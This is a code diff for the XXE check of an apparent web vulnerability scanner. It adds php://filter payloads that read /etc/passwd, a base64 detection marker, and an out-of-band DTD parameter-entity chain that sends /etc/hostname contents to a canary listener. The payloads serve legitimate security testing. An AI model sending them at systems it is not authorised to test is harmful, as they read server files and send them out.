@@ -71,6 +71,15 @@ const xxeBaselineDoc = `<?xml version="1.0" encoding="UTF-8"?><hyperz-baseline/>
 // callsite branch. The DOCTYPE syntax is the classic in-band XXE shape:
 // declare a SYSTEM-resolved external entity and reference it from the
 // document body.
+//
+// The php://filter variants exist because /etc/passwd contains bytes
+// (line breaks, colons) that an XML parser may reject when inlined as
+// entity-expanded text, dropping the disclosure before it lands in the
+// response. PHP's stream filter wraps the file in base64 first, which
+// is XML-clean - the matcher then looks for the base64-encoded
+// "root:x:0:0:" prefix instead of the raw passwd line. Same payload
+// also lets the check read PHP source files (.php) that would otherwise
+// be inlined as nested XML and break the parse.
 var xxeFileDiscloseDocs = []string{
 	`<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
@@ -78,6 +87,36 @@ var xxeFileDiscloseDocs = []string{
 	`<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>` +
 		`<foo>&xxe;</foo>`,
+	`<?xml version="1.0" encoding="UTF-8"?>` +
+		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>` +
+		`<foo>&xxe;</foo>`,
+	`<?xml version="1.0" encoding="UTF-8"?>` +
+		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">]>` +
+		`<foo>&xxe;</foo>`,
+}
+
+// xxeBase64Markers are content needles that prove a php://filter
+// base64-encoded file disclosure landed. The php://filter
+// convert.base64-encode stream encodes the file from its first byte
+// in a continuous run, so the base64 prefix of /etc/passwd's
+// "root:x:0:" - the stable first 9 bytes that don't depend on the
+// 10th byte - emerges verbatim at the start of the encoded blob.
+// A hit here is equivalent in meaning to a TraversalMarkers hit on
+// the plaintext.
+//
+// "cm9vdDp4OjA6" is base64("root:x:0:"). 12 chars (= 9 bytes), the
+// largest aligned prefix of /etc/passwd whose encoding does not
+// depend on byte 10 of the file - byte 10 spills into the high bits
+// of the 13th base64 char, so a longer marker would have to predict
+// the gid digit (0 for root, but not enforceable). 12 chars is long
+// enough not to collide with prose (the alphabet is mixed-case + the
+// 9 + 6 = base64 digits).
+//
+// No Windows analog: php://filter is a PHP-only wrapper and the
+// Windows hosts file is small enough that the plaintext matcher
+// already catches it without base64 wrapping.
+var xxeBase64Markers = []string{
+	"cm9vdDp4OjA6",
 }
 
 // xxeErrorDocs are payloads engineered to make a permissive XML parser
@@ -188,6 +227,18 @@ func (c XXE) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scope
 			if err := c.probeOOB(ctx, client, oobSrv, p.URL, cand); err != nil {
 				Report(ctx, fmt.Errorf("oob probe %s %s: %w", cand.Method, cand.URL, err))
 			}
+			// OOB DTD exfiltration: stricter capability probe. The basic
+			// OOB probe above proves SYSTEM general entities resolve;
+			// this one proves the parser also fetches the DOCTYPE external
+			// DTD subset and expands parameter entities defined inside
+			// it. Some hardened parsers block general entities but not
+			// parameter entities, which is the precondition for the
+			// classic file-exfil-over-HTTP chain. The listener serves a
+			// real DTD body so the parser actually drives the exfil
+			// callback we observe at Drain time.
+			if err := c.probeOOBDTDExfil(ctx, client, oobSrv, p.URL, cand); err != nil {
+				Report(ctx, fmt.Errorf("oob dtd-exfil probe %s %s: %w", cand.Method, cand.URL, err))
+			}
 		}
 	}
 	if firstErr != nil && len(findings) == 0 {
@@ -196,15 +247,37 @@ func (c XXE) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scope
 	return findings, nil
 }
 
+// Extra-map keys carried on XXE OOB registrations. Drain reads these to
+// pick the right finding builder for each variant. variantKey discriminates
+// the three XXE OOB shapes; exfilTokenKey links a DTD-loader registration
+// to the receiver canary that captures any parameter-entity callback.
+const (
+	xxeVariantKey    = "variant"
+	xxeExfilTokenKey = "exfil_token"
+
+	xxeVariantSystem       = "oob-system"
+	xxeVariantDTDLoader    = "oob-dtd-loader"
+	xxeVariantDTDExfilRecv = "oob-dtd-exfil-receiver"
+)
+
+// xxeOOBExfilProbeFile is the path the OOB DTD reads via a parameter
+// entity. /etc/hostname is single-line and almost universally present
+// on POSIX hosts; multi-line files (passwd) break URL formation when
+// the parser tries to splice their content into the exfil callback URL.
+// A hit with empty data is still proof of parameter-entity expansion,
+// which is the capability the check is testing for.
+const xxeOOBExfilProbeFile = "file:///etc/hostname"
+
 // probeOOB sends one XML document declaring an external entity whose
 // SYSTEM target is the canary URL. The check does not emit a finding
 // from this call; Drain translates listener-side callbacks into
 // findings after the scanner's wait window elapses.
 func (c XXE) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, cand xxeCandidate) error {
 	canary := srv.Register("xxe", map[string]string{
-		"target": target,
-		"method": cand.Method,
-		"url":    cand.URL,
+		xxeVariantKey: xxeVariantSystem,
+		"target":      target,
+		"method":      cand.Method,
+		"url":         cand.URL,
 	})
 	doc := `<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + canary.HTTPURL + `">]>` +
@@ -213,8 +286,54 @@ func (c XXE) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Se
 	return err
 }
 
-// Drain emits one finding per OOB registration that observed at least
-// one callback during the scan. Implements OOBCheck.
+// probeOOBDTDExfil sends an XML document that references an external
+// DTD subset hosted on the OOB listener. The listener serves a DTD
+// body containing the classic parameter-entity exfil chain:
+//
+//	<!ENTITY % file SYSTEM "file:///etc/hostname">
+//	<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://listener/<exfil>?d=%file;'>">
+//	%wrap;
+//	%send;
+//
+// A parser that fetches the DTD demonstrates external-DTD-subset
+// processing; if it also expands the parameter entities the wrapper
+// declares, it issues a second callback to the exfil token with the
+// file content inlined into the query string. Drain reports either
+// outcome as a distinct variant of XXE.
+func (c XXE) probeOOBDTDExfil(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, cand xxeCandidate) error {
+	exfilCanary := srv.Register("xxe", map[string]string{
+		xxeVariantKey: xxeVariantDTDExfilRecv,
+		"target":      target,
+		"method":      cand.Method,
+		"url":         cand.URL,
+	})
+	dtdBody := `<!ENTITY % file SYSTEM "` + xxeOOBExfilProbeFile + `">` +
+		`<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '` + exfilCanary.HTTPURL + `?d=%file;'>">` +
+		`%wrap;` +
+		`%send;`
+	dtdCanary := srv.RegisterAsset("xxe", dtdBody, "application/xml-dtd", map[string]string{
+		xxeVariantKey:    xxeVariantDTDLoader,
+		xxeExfilTokenKey: exfilCanary.Token,
+		"target":         target,
+		"method":         cand.Method,
+		"url":            cand.URL,
+	})
+	doc := `<?xml version="1.0" encoding="UTF-8"?>` +
+		`<!DOCTYPE foo SYSTEM "` + dtdCanary.HTTPURL + `">` +
+		`<foo>x</foo>`
+	_, _, _, _, err := c.send(ctx, client, cand, doc)
+	return err
+}
+
+// Drain emits findings for every XXE OOB registration whose canary
+// observed at least one callback. Variants are dispatched by the
+// "variant" Extra field so each shape gets the finding wording that
+// matches its proven capability. The DTD-exfil receiver registration
+// is intentionally skipped here: its loader sibling reads the
+// receiver's hits via the stored exfil token and emits the combined
+// finding so the report doesn't duplicate the same probe pair.
+//
+// Implements OOBCheck.
 func (c XXE) Drain(ctx context.Context) []Finding {
 	srv := OOBFrom(ctx)
 	if srv == nil {
@@ -222,11 +341,20 @@ func (c XXE) Drain(ctx context.Context) []Finding {
 	}
 	var out []Finding
 	for _, reg := range srv.Registrations(c.Name()) {
-		hits := srv.Hits(reg.Canary.Token)
-		if len(hits) == 0 {
+		switch reg.Extra[xxeVariantKey] {
+		case xxeVariantDTDExfilRecv:
 			continue
+		case xxeVariantDTDLoader:
+			if f := buildXXEDTDExfilFinding(reg, srv); f != nil {
+				out = append(out, *f)
+			}
+		default:
+			hits := srv.Hits(reg.Canary.Token)
+			if len(hits) == 0 {
+				continue
+			}
+			out = append(out, buildXXEOOBFinding(reg, hits))
 		}
-		out = append(out, buildXXEOOBFinding(reg, hits))
 	}
 	return out
 }
@@ -275,6 +403,134 @@ func buildXXEOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
 		},
 		DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob"),
 	}
+}
+
+// buildXXEDTDExfilFinding renders findings for the OOB DTD-exfil
+// variant. reg is the DTD-loader registration; the receiver token is
+// read from reg.Extra[xxeExfilTokenKey] so the helper can correlate
+// the two halves of the probe pair.
+//
+// Three outcomes:
+//
+//	exfil hit + loader hit -> Critical: full parameter-entity exfil
+//	loader hit only        -> High: external DTD fetched, no param-entity callback
+//	no hits                -> nil (nothing to report)
+//
+// Loader-only hits get downgraded relative to the basic OOB-system
+// finding (also Critical) because they prove only DTD fetch, not file
+// content exfiltration. They are still worth surfacing because some
+// hardened parsers block SYSTEM general entities but leave external
+// DTD subset processing on - i.e. this branch fires in cases the
+// basic OOB-system branch wouldn't.
+func buildXXEDTDExfilFinding(reg oob.Registration, srv oob.Server) *Finding {
+	loaderHits := srv.Hits(reg.Canary.Token)
+	exfilToken := reg.Extra[xxeExfilTokenKey]
+	var exfilHits []oob.Hit
+	if exfilToken != "" {
+		exfilHits = srv.Hits(exfilToken)
+	}
+	if len(loaderHits) == 0 && len(exfilHits) == 0 {
+		return nil
+	}
+	target := reg.Extra["target"]
+	method := reg.Extra["method"]
+	endpointURL := reg.Extra["url"]
+	remediation := "Disable external entity AND external DTD subset processing in the XML parser. " +
+		"For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable " +
+		"http://apache.org/xml/features/nonvalidating/load-external-dtd plus " +
+		"http://xml.org/sax/features/external-parameter-entities. " +
+		"For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. " +
+		"For PHP libxml, call libxml_disable_entity_loader(true) and avoid LIBXML_DTDLOAD/LIBXML_DTDATTR. " +
+		"For Python lxml, parse with resolve_entities=False, no_network=True, load_dtd=False."
+
+	if len(exfilHits) > 0 {
+		hit := exfilHits[0]
+		exfilData := extractExfilData(hit.Path)
+		dataNote := "(no data captured; the parameter-entity callback fired with an empty payload, which still proves the chain)"
+		if exfilData != "" {
+			dataNote = fmt.Sprintf("captured payload (URL-decoded): %q", exfilData)
+		}
+		return &Finding{
+			Check:    "xxe",
+			Target:   target,
+			URL:      endpointURL,
+			Severity: SeverityCritical,
+			Title:    fmt.Sprintf("XML External Entity (OOB DTD exfiltration) in %s %s", method, endpointURL),
+			Detail: fmt.Sprintf(
+				"Endpoint %s %s parses XML with external DTD processing AND parameter-entity expansion enabled. "+
+					"The check planted an external DTD on canary %s; the parser fetched it, expanded the parameter "+
+					"entity chain, and called back into the exfil canary %s with the contents of %s in the URL. "+
+					"%s. An attacker can read arbitrary server-side files reachable by the parser process and "+
+					"smuggle them out over HTTP without ever needing the response body to echo the disclosure.",
+				method, endpointURL,
+				reg.Canary.HTTPURL, "http://"+srv.CallbackHost()+"/"+exfilToken,
+				xxeOOBExfilProbeFile, dataNote),
+			CWE:         "CWE-611",
+			OWASP:       "A05:2021 Security Misconfiguration",
+			Remediation: remediation,
+			Evidence: &Evidence{
+				Method:     method,
+				RequestURL: endpointURL,
+				Snippet: fmt.Sprintf(
+					"DTD canary URL: %s\nExfil canary URL: %s\nFirst exfil hit: %s %s from %s at %s\nUser-Agent: %s\nExfil hits: %d\nLoader hits: %d\n",
+					reg.Canary.HTTPURL, "http://"+srv.CallbackHost()+"/"+exfilToken,
+					hit.Method, hit.Path, hit.SourceAddr,
+					hit.Timestamp.Format(time.RFC3339),
+					hit.Headers.Get("User-Agent"),
+					len(exfilHits), len(loaderHits)),
+			},
+			DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob-dtd-exfil"),
+		}
+	}
+
+	hit := loaderHits[0]
+	return &Finding{
+		Check:    "xxe",
+		Target:   target,
+		URL:      endpointURL,
+		Severity: SeverityHigh,
+		Title:    fmt.Sprintf("XML External Entity (external DTD fetched) in %s %s", method, endpointURL),
+		Detail: fmt.Sprintf(
+			"Endpoint %s %s parses XML with external DTD subset processing enabled: the parser fetched the "+
+				"DOCTYPE-referenced DTD from canary %s (%d hit(s)) but did not call back through the "+
+				"parameter-entity exfil chain the DTD body declared. Some parsers in this state still permit "+
+				"data exfiltration via alternate DTD shapes (error-based, FTP-based) or escalate to file "+
+				"disclosure once parameter-entity expansion is enabled.",
+			method, endpointURL, reg.Canary.HTTPURL, len(loaderHits)),
+		CWE:         "CWE-611",
+		OWASP:       "A05:2021 Security Misconfiguration",
+		Remediation: remediation,
+		Evidence: &Evidence{
+			Method:     method,
+			RequestURL: endpointURL,
+			Snippet: fmt.Sprintf(
+				"DTD canary URL: %s\nFirst loader hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
+				reg.Canary.HTTPURL,
+				hit.Method, hit.Path, hit.SourceAddr,
+				hit.Timestamp.Format(time.RFC3339),
+				hit.Headers.Get("User-Agent"),
+				len(loaderHits)),
+		},
+		DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob-dtd-loader"),
+	}
+}
+
+// extractExfilData pulls the value of the "d" query parameter out of
+// the exfil callback path. Returns "" if the parameter is absent or
+// undecodable - some parsers URL-encode the file content before
+// splicing, others don't, and a few drop the query string entirely
+// when newline-containing entity values fail to assemble into a
+// well-formed URL.
+func extractExfilData(rawPath string) string {
+	q := strings.IndexByte(rawPath, '?')
+	if q < 0 {
+		return ""
+	}
+	values, err := url.ParseQuery(rawPath[q+1:])
+	if err != nil {
+		return ""
+	}
+	return values.Get("d")
 }
 
 // xxeCandidate is one endpoint the XXE check will POST XML at. method is
@@ -360,9 +616,14 @@ func (c XXE) probe(ctx context.Context, client *httpclient.Client, target string
 	baselineMarkers := matchTraversalMarkers(baselineBody)
 	baselineErrors := matchXXEErrors(baselineBody)
 
+	baselineBase64 := matchXXEBase64Markers(baselineBody)
+
 	// Phase 1: file disclosure. A TraversalMarkers hit means the parser
 	// dereferenced our external entity and bled file content into the
-	// response - the textbook in-band XXE proof.
+	// response - the textbook in-band XXE proof. The base64 fallback
+	// catches php://filter / convert.base64-encode disclosures where
+	// the raw file bytes never appear in the response but the encoded
+	// blob does.
 	for _, doc := range xxeFileDiscloseDocs {
 		if ctx.Err() != nil {
 			break
@@ -374,7 +635,11 @@ func (c XXE) probe(ctx context.Context, client *httpclient.Client, target string
 		hits := matchTraversalMarkers(body)
 		newHits := subtractPatterns(hits, baselineMarkers)
 		if len(newHits) == 0 {
-			continue
+			b64Hits := subtractPatterns(matchXXEBase64Markers(body), baselineBase64)
+			if len(b64Hits) == 0 {
+				continue
+			}
+			newHits = b64Hits
 		}
 		method, probeURL := requestIdentity(req)
 		return &Finding{
@@ -479,6 +744,24 @@ func (c XXE) send(ctx context.Context, client *httpclient.Client, cand xxeCandid
 		return req, resp, nil, false, err
 	}
 	return req, resp, body, truncated, nil
+}
+
+// matchXXEBase64Markers returns every xxeBase64Markers entry found in
+// body. Case-sensitive on purpose: base64 is case-sensitive and a
+// case-folded scan would collide with prose words that happen to share
+// the alphabet (the marker has no vowel run that case-folding could
+// disambiguate from English text).
+func matchXXEBase64Markers(body []byte) []string {
+	if len(body) == 0 {
+		return nil
+	}
+	var hits []string
+	for _, m := range xxeBase64Markers {
+		if bytes.Contains(body, []byte(m)) {
+			hits = append(hits, m)
+		}
+	}
+	return hits
 }
 
 // matchXXEErrors returns every xxeErrorPatterns entry that appears in
